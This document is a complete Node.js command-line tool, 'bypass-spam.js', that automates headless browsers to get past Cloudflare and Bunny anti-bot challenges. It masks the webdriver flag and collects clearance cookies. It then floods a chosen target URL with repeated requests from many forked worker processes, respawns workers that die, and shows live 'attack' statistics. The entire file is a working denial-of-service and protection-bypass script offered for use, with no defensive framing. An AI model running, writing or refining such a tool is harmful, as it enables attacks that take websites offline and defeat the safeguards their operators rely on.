const { connect } = require("puppeteer-real-browser");
const cluster = require("cluster");
const url = require("url");

if (process.argv.length < 5) {
    console.log("Usage: node bypass-spam.js <target> <time> <threads>");
    console.log("Example: node bypass-spam.js https://example.com 60 4");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    threads: parseInt(process.argv[4]),
    rate: 4
};

global.stats = {
    total: 0,
    success: 0,
    blocked: 0,
    bypassed: 0,
    startTime: Date.now()
};

class BrowserSession {
    constructor(id) {
        this.id = id;
        this.browser = null;
        this.page = null;
        this.cookies = [];
        this.userAgent = "";
        this.active = false;
        this.interval = null;
    }

    async init() {
        try {
            const response = await connect({
                headless: true,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--no-first-run',
                    '--no-zygote',
                    '--disable-gpu',
                    '--window-size=1920,1080',
                    '--disable-web-security'
                ],
                turnstile: true,
                connectOption: { defaultViewport: null, ignoreHTTPSErrors: true }
            });

            this.browser = response.browser;
            this.page = response.page;

            await this.page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
            
            await this.page.evaluateOnNewDocument(() => {
                Object.defineProperty(navigator, 'webdriver', { get: () => false });
            });

            return true;
        } catch (error) {
            return false;
        }
    }

    async bypass() {
        try {
            await this.page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 60000 });
            
            let checks = 0;
            const maxChecks = 40;
            
            while (checks < maxChecks) {
                await this.page.waitForTimeout(500);
                
                const cookies = await this.page.cookies();
                const cfClearance = cookies.find(c => c.name === "cf_clearance");
                
                if (cfClearance) {
                    this.cookies = cookies;
                    this.userAgent = await this.page.evaluate(() => navigator.userAgent);
                    global.stats.bypassed++;
                    return true;
                }
                
                const isChallenge = await this.page.evaluate(() => {
                    const title = (document.title || "").toLowerCase();
                    return title.includes("just a moment") || title.includes("checking");
                });
                
                if (!isChallenge) {
                    this.cookies = cookies;
                    this.userAgent = await this.page.evaluate(() => navigator.userAgent);
                    return true;
                }
                
                checks++;
                
                if (checks % 5 === 0) {
                    await this.page.evaluate(() => {
                        const button = document.querySelector('input[type="submit"], button');
                        if (button) button.click();
                    });
                }
            }
            
            this.cookies = await this.page.cookies();
            this.userAgent = await this.page.evaluate(() => navigator.userAgent);
            return true;
            
        } catch (error) {
            return false;
        }
    }

    async startSpam() {
        if (!this.page) return;
        
        this.active = true;
        const cookieString = this.cookies.map(c => `${c.name}=${c.value}`).join('; ');
        
        this.interval = setInterval(async () => {
            if (!this.active) return;
            
            for (let i = 0; i < args.rate; i++) {
                try {
                    const status = await this.page.evaluate(async (url, cookie) => {
                        try {
                            const response = await fetch(url, {
                                method: 'GET',
                                headers: {
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                    'Accept-Language': 'en-US,en;q=0.9',
                                    'Cookie': cookie
                                },
                                credentials: 'include',
                                referrer: url
                            });
                            return response.status;
                        } catch {
                            return 0;
                        }
                    }, args.target, cookieString);

                    global.stats.total++;
                    
                    if (status === 200 || status === 201 || status === 202) {
                        global.stats.success++;
                    } else if (status === 403 || status === 429) {
                        global.stats.blocked++;
                    } else if (status > 0) {
                        global.stats.success++;
                    } else {
                        global.stats.blocked++;
                    }
                    
                    await this.page.waitForTimeout(250);
                } catch {
                    global.stats.total++;
                    global.stats.blocked++;
                }
            }
        }, 1000);
    }

    async stop() {
        this.active = false;
        if (this.interval) clearInterval(this.interval);
        try {
            if (this.page) await this.page.close();
            if (this.browser) await this.browser.close();
        } catch {}
    }
}

function displayStats() {
    const elapsed = Math.floor((Date.now() - global.stats.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);
    
    console.clear();
    console.log("CLOUDFLARE/BUNNY BYPASS + BROWSER SPAM");
    console.log(`Target: ${args.target}`);
    console.log(`Time: ${elapsed}s / ${args.time}s (${remaining}s remaining)`);
    console.log(`Threads: ${args.threads} | Rate: ${args.rate}rps`);
    console.log(`Bypassed: ${global.stats.bypassed}/${args.threads}`);
    console.log("");
    console.log("REQUEST STATS:");
    console.log(`Total: ${global.stats.total}`);
    console.log(`Success: ${global.stats.success} (${global.stats.total > 0 ? ((global.stats.success/global.stats.total)*100).toFixed(2) : 0}%)`);
    console.log(`Blocked: ${global.stats.blocked} (${global.stats.total > 0 ? ((global.stats.blocked/global.stats.total)*100).toFixed(2) : 0}%)`);
    console.log(`RPS: ${elapsed > 0 ? (global.stats.total/elapsed).toFixed(2) : 0}`);
    
    const progress = Math.min(100, (elapsed/args.time)*100);
    const bar = "#".repeat(Math.floor(progress/3.33)) + "-".repeat(30-Math.floor(progress/3.33));
    console.log(`[${bar}] ${progress.toFixed(1)}%`);
}

if (cluster.isMaster) {
    console.log("Starting bypass and spam attack...");
    console.log(`Target: ${args.target}`);
    console.log(`Duration: ${args.time}s | Threads: ${args.threads}`);
    
    for (let i = 0; i < args.threads; i++) {
        cluster.fork({ WORKER_ID: i+1 });
    }
    
    const statsInterval = setInterval(displayStats, 1000);
    
    setTimeout(() => {
        clearInterval(statsInterval);
        displayStats();
        console.log("\nAttack completed.");
        
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        
        setTimeout(() => process.exit(0), 2000);
    }, args.time * 1000);
    
    cluster.on('exit', () => {
        const newWorker = cluster.fork();
        newWorker.process.env.WORKER_ID = newWorker.id;
    });
    
} else {
    const session = new BrowserSession(process.env.WORKER_ID);
    
    const run = async () => {
        const init = await session.init();
        if (!init) return process.exit(1);
        
        const bypassed = await session.bypass();
        if (!bypassed) return process.exit(1);
        
        await session.startSpam();
        
        setTimeout(async () => {
            await session.stop();
            process.exit(0);
        }, args.time * 1000);
    };
    
    run();
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
